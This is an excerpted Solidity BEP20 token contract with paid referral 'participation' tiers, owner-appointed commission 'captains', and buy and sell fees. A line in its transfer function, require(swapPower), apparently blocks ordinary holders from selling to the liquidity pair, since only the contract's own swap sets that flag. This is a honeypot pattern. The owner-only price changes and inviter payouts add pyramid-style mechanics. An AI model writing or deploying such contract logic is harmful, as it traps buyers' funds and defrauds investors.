...
contract Token is BEP20{
    ...
    mapping(uint32 => address) private _commcaptain;

    mapping(address => bool) private onepart_player;
    mapping(address => bool) private twopart_player;

    uint32 private _captiancount;
    mapping(address => uint32) private _playercomm;
    ...
    uint256 public twopart_limit;
    uint256 public onepart_buyprice;
    uint256 public twopart_buyprice;
    ...
    constructor(address _Marketing,address _LPaddress) {
        ...
        _decimals=18;
        _owner=msg.sender;
        onepart_buyprice=5000000000000000000;
        twopart_buyprice=8000000000000000000;
    ...
    function captiangetaddress(uint32 commid) public view virtual returns (address) {
        return _commcaptain[commid];
    }
    function captiancount() public view virtual returns (uint32) {
        return _captiancount;
    }
    ...
    function onepart(address invite_address,uint32 comm)public{
        require(onepart_limit<=1000000000000000000000,"onepart over!");
        require(!onepart_player[msg.sender],"already participated");
        uint256 invite_aw=onepart_buyprice/2;
        swapAndLiquify(invite_aw,pricetoken);
        bool result=safetransferFrom(pricetoken,msg.sender,invite_address,invite_aw);
        if(result){
            onepart_limit+=1000000000000000000;
            _transfer(address(this),msg.sender,1000000000000000000);
            _playercomm[msg.sender]=comm;
            onepart_player[msg.sender]=true;
        }
    }
    function twopart(address invite_address,uint32 comm)public{
        require(twopart_limit<=4800000000000000000000,"twopart over!");
        require(!twopart_player[msg.sender],"already participated");
        uint256 invite_aw=twopart_buyprice/2;
        swapAndLiquify(invite_aw,pricetoken);
        bool result=safetransferFrom(pricetoken,msg.sender,invite_address,invite_aw);
        if(result){
            twopart_limit+=1000000000000000000;
            _transfer(address(this),msg.sender,1000000000000000000);
            _playercomm[msg.sender]=comm;
            twopart_player[msg.sender]=true;
        }
    }
    function swapAndLiquify(uint256 tokens,address token) private {
        uint256 half = tokens/2;
        uint256 otherHalf = tokens-half;
        uint256 initialBalance = address(this).balance;
        bool oldswapstate=swapPower;
        swapPower=true;
        swapTokensForEth(half,token);
    ...
    function addLiquidity(uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), 1);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(address(this),1,0,0,LPaddress,block.timestamp);
    }
    function swapTokensForEth(uint256 tokenAmount,address token) private {
        ...
        approve_result=BEP20(token).approve(address(uniswapV2Router), tokenAmount);
        }
        if(approve_result){
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(_pairaddress[recipient]){
            require(swapPower);
            uint256 burnfee=(amount/100)*6;
            uint256 lpfee=(amount/100)*4;
            ...
            _balances[_commcaptain[_playercomm[sender]]]+=commcaptainfee;
        ...
        if(_pairaddress[sender]){
            ...
            _balances[LPaddress]+=lpfee;
            _balances[Marketing]+=Marketfee;
            _balances[_commcaptain[_playercomm[recipient]]]+=commcaptainfee;
            amount-=(burnfee+lpfee+Marketfee+commcaptainfee);
        }
    ...
    function setprice(uint256 price1,uint256 price2)public{
        require(msg.sender==_owner,"not a permission!");
        onepart_buyprice=price1;
        twopart_buyprice=price2;
    }
    ...
    function regcommcaptian(address captianaddress)public{
        require(msg.sender==_owner,"not a permission!");
        _commcaptain[_captiancount]=captianaddress;
        _captiancount+=1;
    }
